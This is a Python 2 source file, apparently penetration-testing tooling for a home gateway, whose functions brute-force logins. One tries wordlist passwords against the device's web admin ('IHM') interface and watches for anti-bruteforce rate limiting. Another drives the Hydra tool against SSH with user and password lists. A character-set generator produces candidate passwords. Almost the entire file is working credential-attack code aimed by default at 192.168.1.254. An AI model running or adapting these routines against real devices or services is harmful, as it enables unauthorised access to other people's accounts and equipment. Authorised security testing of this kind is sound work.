#!/usr/bin/python
#-*- coding: latin-1 -*-


# This module will contains 3 methods
# 1. Bruteforce_ihm_login
# 2. Bruteforce_ssh_login
import time
import base64
import itertools
import iad_ihm
from subprocess import Popen,PIPE

charset='abcdefghijklmopqrstuvwxyzABCDEFGHIJKLMOPQRSTUVWXYZ1234567890&!:;,./?*%$][{}|'
minlength=1
maxlength=20
def random_sequence_gen(charset=charset,minlength=minlength,maxlength=maxlength):
    """
    This method bruteforces the caracter set according to the charset,minlength,max length
    """

    return(''.join(candidate)
        for candidate in itertools.chain.from_iterable(itertools.product(charset,repeat=i)
        for i in range(minlength,maxlength +1)))


def bruteforce_ihm_login(ip,wordlist=""):
    """
    This method is used to bruteforce the IHM authentication. It uses random_sequence_gen() to generate passwords.
    Prints the password if the password is found
    """
    startTime= time.time()
    connection=iad_ihm.ihm_connection()
    #setting the IP
    connection.TARGET_IP=ip
    connection.BASE_URL='http://'+ connection.TARGET_IP
    connection.verbose=False # make sure that all wrong password messages does not pop up
    tries=0
    with  open(wordlist,"r") as f:
        for line in f:
            value=connection.ihm_login(password=line)
            if value==1:
                print "The password is:" +line
                return False # to indicate that the 
            elif value==429:
                print "[WARNING] Please disable Anti bruteforce if you really want to bruteforce "
                print "Number of attempts: "+ str(tries)
                return True # To indicate that the test was sucessful
                 #connection.ihm_init_tokens()
            tries+=1
    endTime=time.time()
    print "SORRY :(  NO PASSSWORD FOUND"
    print "The number of passwords attempt:" + str(tries)
    print "Time elapse:"+str((endTime-startTime)/60)+"minutes"


def bruteforce_ssh_login(target="192.168.1.254",user_list=None,pass_list=None,port=22):
    """
    This is used to bruteforce ssh login. It uses the tool HYDRA from The Hacker's Choise. 
    This test assumes that the attackter has no information about the username so a list of users names has to be provided
    PARAMETERS: user_list , pass_list, target,port
    
    """
  
    process=Popen(['hydra',target,'ssh','-L',user_list,'-P',pass_list,'-s',str(port),'-vv'],stderr=PIPE,stdin=PIPE,stdout=PIPE)
    print "The process ID is "+ str(process.pid)
    process.communicate()
    return process.pid

#iad_ihm.ihm_login(password="11")
    
#for x in random_sequence_gen():

 #   print x

#bruteforce_ihm_login("192.168.1.254",wordlist="list_of_links");
#bruteforce_ssh_login(target="192.168.1.254",user_list="list_of_links",pass_list="list_of_links")
